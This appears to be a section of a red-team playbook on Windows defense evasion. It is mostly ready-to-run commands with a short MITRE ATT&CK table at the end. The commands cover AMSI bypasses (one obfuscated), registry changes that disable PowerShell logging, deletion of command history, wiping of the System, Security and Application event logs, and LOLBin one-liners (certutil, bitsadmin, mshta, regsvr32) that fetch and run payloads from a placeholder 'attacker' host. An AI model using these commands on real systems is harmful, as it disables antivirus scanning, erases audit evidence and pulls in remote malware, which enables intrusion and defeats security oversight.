# 🥷 Phase 8: Defense Evasion

Techniques to avoid detection by AV, EDR, and monitoring systems during a red team engagement.

---

## 8.1 AMSI Bypass

Anti-Malware Scan Interface (AMSI) blocks malicious PowerShell. Bypass it:

```powershell
# Classic AMSI bypass (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Encoding bypass
$w = 'System.Management.Automation.A';$c = 'ms';$i = 'iUtils'
$assembly = [Ref].Assembly.GetType(('{0}{1}{2}' -f $w,$c,$i))
$field = $assembly.GetField(('a{0}siInitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 8.2 PowerShell Logging Evasion

```powershell
# Disable Script Block Logging
Set-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0

# Disable Module Logging
Set-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging -Name EnableModuleLogging -Value 0

# Clear PowerShell history
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

---

## 8.3 Event Log Clearing

```cmd
:: Clear specific event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

:: PowerShell
Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }
```

---

## 8.4 Living Off the Land (LOLBins)

```bash
# Use built-in Windows tools to avoid AV triggers
certutil.exe -urlcache -split -f http://attacker/payload.exe payload.exe
bitsadmin /transfer job /download /priority normal http://attacker/payload.exe C:\Temp\payload.exe
mshta.exe http://attacker/payload.hta
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Impair Defenses: AMSI Bypass | T1562.001 | Disable AV scanning |
| Indicator Removal: Clear Logs | T1070.001 | Event log wiping |
| Signed Binary Proxy: LOLBins | T1218 | Abuse legitimate binaries |
